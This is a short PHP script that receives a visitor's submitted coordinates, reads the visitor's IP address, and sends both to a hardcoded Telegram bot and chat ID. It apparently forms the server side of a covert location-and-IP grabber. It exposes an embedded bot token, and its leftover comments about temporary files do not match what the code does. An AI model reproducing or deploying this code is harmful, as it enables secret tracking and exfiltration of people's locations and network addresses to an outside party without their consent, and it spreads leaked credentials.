<?php

// ###############  SET UP THE VARIABLES  ########################################

// FOLDER USED TO STORE TEMPORAL FILES
//    IMPORTANT: the folder must have proper permissions to allow writing files
//    The name of the temporal files contains the IP address of the user
//    ($_SERVER["DOCUMENT_ROOT"] is the root folder for the website)
$koor = $_POST['data'];
$ip=getIP();

define('BOT_TOKEN', '1318283788:AAGH-JPvODmL8B6YPlg_5FZ05cA9_m6pgjc');
define('CHAT_ID','149713718');
 
function kirimTelegram($pesan) {
    $pesan = json_encode($pesan);
    $API = "https://api.telegram.org/bot".BOT_TOKEN."/sendmessage?chat_id=".CHAT_ID."&text=$pesan";
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
    curl_setopt($ch, CURLOPT_URL, $API);
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
}
 
kirimTelegram("IP=".$ip."       Koordinat=".$koor); 
function getIP() {
        // Option 1 to get the IP address of visitor
        //      if a value for $_SERVER['HTTP_X_FORWARDED_FOR'] is available
        //      $ip is obtained and returned
        if(isset($_SERVER['HTTP_X_FORWARDED_FOR'])){
                $ip=$_SERVER['HTTP_X_FORWARDED_FOR'];
                return $ip;
        }
        // Option 2 to get the IP address of visitor
        //      if a value for $_SERVER['REMOTE_ADDR'] is available
        //      $ip is obtained and returned
        if(isset($_SERVER['REMOTE_ADDR'])){
                $ip = $_SERVER['REMOTE_ADDR'];
                return $ip;
        }
        // IP has not been obtained, so a default IP is returned
        //      The default value will be used very few times, so
        return "0.0.0.0";
}

?>